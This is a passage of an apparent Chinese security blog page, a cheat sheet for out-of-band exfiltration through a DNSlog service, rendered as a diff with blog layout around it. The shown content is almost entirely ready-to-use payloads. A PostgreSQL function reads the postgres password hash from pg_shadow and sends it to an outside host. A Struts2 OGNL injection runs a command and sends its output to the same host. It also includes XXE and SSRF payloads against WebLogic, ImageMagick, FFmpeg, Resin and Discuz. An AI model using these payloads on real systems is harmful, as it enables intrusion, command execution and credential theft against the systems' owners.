+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS table_output;</span><br><span class="line">CREATE TABLE table_output(content text);</span><br><span class="line">CREATE OR REPLACE FUNCTION temp_function()</span><br><span class="line">RETURNS VOID AS $$</span><br><span class="line">DECLARE exec_cmd TEXT;</span><br><span class="line">DECLARE query_result TEXT;</span><br><span class="line">BEGIN</span><br><span class="line">SELECT INTO query_result (SELECT passwd</span><br><span class="line">FROM pg_shadow WHERE usename=&apos;postgres&apos;);</span><br><span class="line">exec_cmd := E&apos;COPY table_output(content)</span><br><span class="line">FROM E\&apos;\\\\\\\\&apos;||query_result||E&apos;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&apos;&apos;;</span><br><span class="line">EXECUTE exec_cmd;</span><br><span class="line">END;</span><br><span class="line">$$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class="line">SELECT temp_function();</span><br></pre></td></tr></table></figure>
+<h4 id="XML-Entity-Injection"><a href="#XML-Entity-Injection" class="headerlink" title="XML Entity Injection"></a>XML Entity Injection</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test"&gt;</span><br><span class="line">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><h4 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xx.action?redirect:http://ip.port.b182oj.ceye.io/%25&#123;3*4&#125;</span><br><span class="line"></span><br><span class="line">xx.action?redirect:$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&quot;http://ip.port.b182oj.ceye.io/result%3d&quot;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&quot;GET&quot;),%23http.connect(),%23http.getInputStream()&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="FFMpeg"><a href="#FFMpeg" class="headerlink" title="FFMpeg"></a>FFMpeg</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://ip.port.b182oj.ceye.io</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>
+<h4 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Businesslocation&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+<h4 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(http://ip.port.b182oj.ceye.io)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+<h4 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf</span><br></pre></td></tr></table></figure>
+<h4 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxxx.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo</span><br></pre></td></tr></table></figure>
+<p>Link:</p>
+<blockquote>
+<ul>
+<li><a href="http://www.freebuf.com/articles/system/129068.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/129068.html</a></li>
+<li><a href="http://www.freebuf.com/sectool/87846.html[手把手教你DIY一个CloudEye" target="_blank" rel="external">http://www.freebuf.com/sectool/87846.html[手把手教你DIY一个CloudEye</a>]</li>
+</ul>
+</blockquote>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/09/一星期实战总结（七）/" rel="next" title="一星期实战总结（七）">
+                <i class="fa fa-chevron-left"></i> 一星期实战总结（七）
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/31/Samba-CVE-2017-7494-复现/" rel="prev" title="Samba(CVE-2017-7494)复现">
+                Samba(CVE-2017-7494)复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/05/21/Tankeye使用宝典/"
+           data-title="Tankeye使用宝典" data-url="http://yoursite.com/2017/05/21/Tankeye使用宝典/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#可以用来做什么？"><span class="nav-number">1.</span> <span class="nav-text">可以用来做什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux"><span class="nav-number">2.</span> <span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows"><span class="nav-number">3.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#高级技巧收集"><span class="nav-number">4.</span> <span class="nav-text">高级技巧收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、编码后返回结果"><span class="nav-number">4.1.</span> <span class="nav-text">1、编码后返回结果</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、UserAgent中携带数据"><span class="nav-number">4.2.</span> <span class="nav-text">2、UserAgent中携带数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、读取指定行返回"><span class="nav-number">4.3.</span> <span class="nav-text">3、读取指定行返回</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、分段返回命令结果"><span class="nav-number">4.4.</span> <span class="nav-text">4、分段返回命令结果</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5、接收POST数据"><span class="nav-number">4.5.</span> <span class="nav-text">5、接收POST数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-PowerShell实现Windows密码回传"><span class="nav-number">4.6.</span> <span class="nav-text">6.PowerShell实现Windows密码回传</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-Injection"><span class="nav-number">5.</span> <span class="nav-text">SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-Server"><span class="nav-number">5.1.</span> <span class="nav-text">SQL Server</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle"><span class="nav-number">5.2.</span> <span class="nav-text">Oracle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MySQL"><span class="nav-number">5.3.</span> <span class="nav-text">MySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PostgreSQL"><span class="nav-number">5.4.</span> <span class="nav-text">PostgreSQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XML-Entity-Injection"><span class="nav-number">5.5.</span> <span class="nav-text">XML Entity Injection</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Others"><span class="nav-number">6.</span> <span class="nav-text">Others</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Struts2"><span class="nav-number">6.1.</span> <span class="nav-text">Struts2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FFMpeg"><span class="nav-number">6.2.</span> <span class="nav-text">FFMpeg</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Weblogic"><span class="nav-number">6.3.</span> <span class="nav-text">Weblogic</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ImageMagick"><span class="nav-number">6.4.</span> <span class="nav-text">ImageMagick</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Resin"><span class="nav-number">6.5.</span> <span class="nav-text">Resin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Discuz"><span class="nav-number">6.6.</span> <span class="nav-text">Discuz</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
